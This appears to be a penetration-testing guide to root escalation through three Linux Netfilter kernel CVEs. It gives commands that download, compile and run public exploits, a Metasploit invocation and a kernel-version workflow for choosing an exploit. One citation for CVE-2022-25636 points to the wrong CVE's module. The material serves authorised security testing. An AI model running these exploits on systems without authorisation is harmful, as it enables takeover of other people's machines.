## Netfilter Kernel Exploits

Netfilter is the Linux kernel subsystem that underpins `iptables`, `nftables`, and all packet filtering. Because it runs in kernel space and handles raw packet data, memory corruption bugs within it are directly exploitable for local privilege escalation. Three CVEs in three consecutive years provide reliable root escalation paths. 
***

## Netfilter CVE Overview

| CVE | Year | Type | Affected Kernels | Component |
|---|---|---|---|---|
| CVE-2021-22555 | 2021 | Heap out-of-bounds write | 2.6.19 to 5.11  [rapid7](https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_xtables_heap_oob_write_priv_esc/) | `net/netfilter/x_tables.c` |
| CVE-2022-25636 | 2022 | Heap out-of-bounds write | 5.4 to 5.6.10 | `net/netfilter/nf_dup_netdev.c` |
| CVE-2023-32233 | 2023 | Use-after-free | up to 6.3.1  [nvd.nist](https://nvd.nist.gov/vuln/detail/CVE-2023-32233) | `net/netfilter/nf_tables_api.c` |

***

## CVE-2021-22555

### Vulnerability

A heap out-of-bounds write in `net/netfilter/x_tables.c` caused by flaws in the `memcpy()` and `memset()` functions within Netfilter's `IPT_SO_SET_REPLACE` and `IP6T_SO_SET_REPLACE` socket options. An attacker can trigger this through user namespaces without root.  It also allows container escape from Docker and Kubernetes. 

### Check and Exploit

```bash
# Confirm vulnerable kernel range
uname -r
# Must be between 2.6.19 and 5.11

# Download and compile (requires -m32 for the 32-bit heap manipulation)
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit

# uid=0(root) gid=0(root) groups=0(root)
```

The `-m32` flag compiles a 32-bit binary, which is intentional because the exploit manipulates 32-bit compat socket options (`IPT_SO_SET_REPLACE`) to corrupt heap memory. 

### Alternative: Metasploit

```bash
use exploit/linux/local/netfilter_xtables_heap_oob_write_priv_esc
set SESSION <session_id>
run
```

***

## CVE-2022-25636

### Vulnerability

A heap out-of-bounds write in `net/netfilter/nf_dup_netdev.c`. The `nf_tables` flow offload feature writes past the end of a heap allocation when the `NFT_FWD_NETDEV` expression references an interface. [rapid7](https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_xtables_heap_oob_write_priv_esc/)

Affects kernels `5.4` through `5.6.10`.

### Check and Exploit

```bash
uname -r
# Must be between 5.4 and 5.6.10

git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

The exploit leaks KASLR base addresses, then uses a ROP chain to overwrite kernel function pointers and spawn a root shell. 

One important caution specific to this CVE: it can corrupt the kernel heap in a way that prevents clean recovery without a reboot. If the exploit is interrupted or fails partway through, the system may become unstable or crash. Only use it when you can tolerate a potential reboot requirement.

***

## CVE-2023-32233

### Vulnerability

A use-after-free in `net/netfilter/nf_tables_api.c`. When `nf_tables` processes batch requests, it creates anonymous sets as temporary workspaces. A bug in how `NFT_MSG_DELRULE` and `NFT_MSG_DELSETELEM` operations are handled means these anonymous sets are freed but remain accessible and modifiable, allowing arbitrary read/write operations on kernel memory. 

Affects all kernels up to and including `6.3.1`.

### Dependency Installation

```bash
# Required libraries for the PoC
apt install libmnl-dev libnftnl-dev   # Debian/Ubuntu
yum install libmnl-devel libnftnl-devel  # RHEL/CentOS
```

### Check and Exploit

```bash
uname -r
# Must be <= 6.3.1

git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit

# uid=0(root) gid=0(root) groups=0(root)
```

The exploit leverages `modprobe_path` overwrite as its privilege escalation primitive, a common kernel exploitation technique where overwriting the kernel variable that stores the path to `modprobe` causes root execution of an attacker-controlled binary the next time an unknown file type is executed. 

***

## Enumeration and Exploit Selection Workflow

```bash
# Step 1: Get full kernel version
uname -r

# Step 2: Match to CVE range
# 2.6.19 - 5.11   -> CVE-2021-22555
# 5.4    - 5.6.10 -> CVE-2022-25636
# up to  - 6.3.1  -> CVE-2023-32233

# Step 3: Check if user namespaces are enabled (required for CVE-2021-22555)
cat /proc/sys/kernel/unprivileged_userns_clone
# 1 = enabled (exploit works)
# 0 = disabled (exploit blocked)

# Step 4: Check nftables capability (relevant to CVE-2023-32233)
which nft
nft list tables 2>/dev/null

# Step 5: Check if linux-exploit-suggester flags Netfilter CVEs
./linux-exploit-suggester.sh | grep -i netfilter
```

***

## Critical Cautions

All three of these exploits manipulate kernel heap memory directly. Unlike userland exploits, a failed or interrupted execution does not simply crash a process. It crashes the kernel, which means an immediate system reboot.  On a real engagement: 

- Confirm you have permission to potentially reboot the target before running
- Run in a screen or tmux session in case your shell drops
- Have a fallback plan if the exploit kills the machine mid-run
- These are last-resort tools when no other escalation path is available
